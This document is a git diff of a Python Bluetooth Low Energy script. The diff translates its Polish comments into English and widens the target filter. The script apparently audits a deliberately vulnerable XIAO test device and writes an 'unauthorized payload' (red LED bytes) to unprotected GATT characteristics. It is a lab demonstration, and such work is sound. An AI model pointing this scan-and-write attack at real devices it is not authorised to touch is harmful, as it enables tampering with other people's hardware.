@@ -1,23 +1,21 @@
-﻿
-
-import asyncio
+﻿import asyncio
 import csv
 import os
 import logging
 from bleak import BleakScanner, BleakClient
 
-# Konfiguracja logowania
+# Logging configuration
 logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s", datefmt="%H:%M:%S")
 logger = logging.getLogger("BLE_Smart_Scanner")
 
 CSV_FILE = "ble_audit_results.csv"
 
-# --- DEFINICJE ZAKRESÓW I WZORCÓW ---
+# --- RANGES AND PATTERNS DEFINITIONS ---
 XIAO_VND_PREFIX = "87654321"     
 TARGET_SERVICE_UUID = "12345678-1234-1234-1234-123456789012".lower()
 
 async def audit_device(device, writer):
-    logger.info(f"[*] Rozpoczynam audyt urządzenia: {device.address}")
+    logger.info(f"[*] Starting device audit: {device.address}")
     try:
         async with BleakClient(device.address, timeout=10.0) as client:
             services = client.services
@@ -25,39 +23,42 @@ async def audit_device(device, writer):
                 for char in service.characteristics:
                     status = "Safe"
                     
-                    # Sprawdzenie Twojego konkretnego wzorca XIAO (Characteristic UUID)
+                    # Checking for your specific XIAO pattern (Characteristic UUID)
                     if char.uuid.startswith(XIAO_VND_PREFIX.lower()):
                         status = "VULNERABLE_TARGET_DETECTED"
-                        logger.warning(f"  [!] Wykryto znany wzorzec XIAO na {char.uuid}")
+                        logger.warning(f"  [!] Detected known XIAO pattern on {char.uuid}")
                         writer.writerow([device.name, device.address, status, char.uuid])
                         
-                        # --- TUTAJ NASTĘPUJE ATAK (PAYLOAD INJECTION) ---
-                        logger.info(f"    -> Wstrzykiwanie nieautoryzowanego payloadu do {char.uuid}...")
-                        test_payload = bytes([255, 0, 0]) # Czerwony kolor dla diody NeoPixel
+                        # --- ATTACK TAKES PLACE HERE (PAYLOAD INJECTION) ---
+                        logger.info(f"    -> Injecting unauthorized payload into {char.uuid}...")
+                        test_payload = bytes([255, 0, 0]) # Red color for NeoPixel LED
                         
                         try:
                             await client.write_gatt_char(char.uuid, test_payload, response=True)
-                            logger.warning(f"    -> [!] SUKCES: Ominięto autoryzację. Wstrzyknięto payload!")
+                            logger.warning(f"    -> [!] SUCCESS: Authorization bypassed. Payload injected!")
                         except Exception as e:
-                            logger.error(f"    -> [-] Błąd zapisu lub autoryzacji: {e}")
+                            logger.error(f"    -> [-] Write or authorization error: {e}")
                         # ------------------------------------------------
 
     except Exception as e:
-        logger.error(f"[-] Błąd podczas audytu {device.address}: {e}")
+        logger.error(f"[-] Error during audit of {device.address}: {e}")
 
 async def main():
-    logger.info("Rozpoczynam nasłuch w poszukiwaniu urządzeń o silnym sygnale (RSSI > -60)...")
-
-    # POPRAWKA: Zmiana d.rssi na ad.rssi zapobiega warningom z biblioteki Bleak
+    
+   # Hybrid filter: Look by UUID (for Windows/pure Linux) 
+    # OR device name for fallible Broadcom drivers (MacBook)
     target_device = await BleakScanner.find_device_by_filter(
-        lambda d, ad: (TARGET_SERVICE_UUID in ad.service_uuids) and (ad and ad.rssi > -60),
+        lambda d, ad: (TARGET_SERVICE_UUID in ad.service_uuids) or \
+                      ("XIAO_Vulnerable_LED" in (d.name or "")) or \
+                      ("XIAO_Vulnerable_LED" in (ad.local_name or "")),
         timeout=20.0
+    
     )
 
     if target_device:
-        logger.info(f"[+] ZNALEZIONO CEL: {target_device.name} [{target_device.address}]")
+        logger.info(f"[+] TARGET FOUND: {target_device.name} [{target_device.address}]")
         
-        # Przygotowanie pliku CSV i uruchomienie audytu/ataku
+        # Preparing CSV file and launching audit/attack
         file_exists = os.path.isfile(CSV_FILE)
         with open(CSV_FILE, mode='a', newline='') as file:
             writer = csv.writer(file)
@@ -66,7 +67,7 @@ async def main():
             
             await audit_device(target_device, writer)
     else:
-        logger.error("[-] Nie znaleziono celu w pobliżu.")
+        logger.error("[-] Target not found nearby.")
 
 if __name__ == "__main__":
     asyncio.run(main())
